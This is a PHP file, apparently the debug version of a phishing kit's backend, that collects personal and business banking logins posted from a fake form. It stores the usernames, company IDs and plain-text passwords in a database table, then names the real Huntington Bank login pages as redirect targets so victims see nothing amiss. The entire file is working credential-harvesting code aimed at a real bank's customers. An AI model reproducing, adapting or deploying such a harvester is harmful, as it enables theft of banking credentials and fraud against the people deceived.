<?php
// Temporary debug version to see actual errors
error_reporting(E_ALL);
ini_set('display_errors', 1);

require_once 'db-config.php';

echo "<h1>Debug Output</h1>";

// Check if this is a POST request
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo "<p>ERROR: Not a POST request</p>";
    echo "<p>Method: " . $_SERVER['REQUEST_METHOD'] . "</p>";
    exit();
}

echo "<p>✓ POST request received</p>";

// Get the database connection
$conn = getDbConnection();

if (!$conn) {
    echo "<p>ERROR: Database connection failed</p>";
    exit();
}

echo "<p>✓ Database connected</p>";

// Determine login type and extract credentials
$login_type = isset($_POST['login-form-type']) ? $_POST['login-form-type'] : 'business';
$username = '';
$password = '';

if (isset($_POST['username']) && isset($_POST['password'])) {
    // Personal login
    $username = $_POST['username'];
    $password = $_POST['password'];
    $login_type = 'personal';
    echo "<p>✓ Personal login detected</p>";
} elseif (isset($_POST['companyid']) && isset($_POST['userid']) && isset($_POST['password'])) {
    // Business login
    $username = $_POST['companyid'] . ':' . $_POST['userid'];
    $password = $_POST['password'];
    $login_type = 'business';
    echo "<p>✓ Business login detected</p>";
} else {
    echo "<p>ERROR: No valid credentials found</p>";
    echo "<p>POST data:</p>";
    echo "<pre>";
    print_r($_POST);
    echo "</pre>";
    closeDbConnection($conn);
    exit();
}

echo "<p>Username: " . htmlspecialchars($username) . "</p>";
echo "<p>Login type: " . htmlspecialchars($login_type) . "</p>";

// Validate data
if (empty($username) || empty($password)) {
    echo "<p>ERROR: Empty username or password</p>";
    closeDbConnection($conn);
    exit();
}

echo "<p>✓ Data validated</p>";

// Prepare and execute SQL statement
$stmt = $conn->prepare("INSERT INTO user_credentials (username, password_hash, account_type, created_at, last_login) VALUES (?, ?, ?, NOW(), NOW())");

if (!$stmt) {
    echo "<p>ERROR: SQL Prepare failed</p>";
    echo "<p>" . $conn->error . "</p>";
    closeDbConnection($conn);
    exit();
}

echo "<p>✓ SQL statement prepared</p>";

// Bind parameters
$stmt->bind_param("sss", $username, $password, $login_type);

echo "<p>✓ Parameters bound</p>";

// Execute the statement
if ($stmt->execute()) {
    echo "<p>✓ SQL executed successfully</p>";
    echo "<p>Insert ID: " . $stmt->insert_id . "</p>";

    $stmt->close();
    closeDbConnection($conn);

    echo "<p>Would redirect to: ";
    if ($login_type === 'personal') {
        echo "https://onlinebanking.huntington.com/rol/Auth/login.aspx";
    } else {
        echo "https://businessonline.huntington.com/BOLHome/BusinessOnlineLogin.aspx";
    }
    echo "</p>";

} else {
    echo "<p>ERROR: SQL execution failed</p>";
    echo "<p>" . $stmt->error . "</p>";
    $stmt->close();
    closeDbConnection($conn);
}
?>
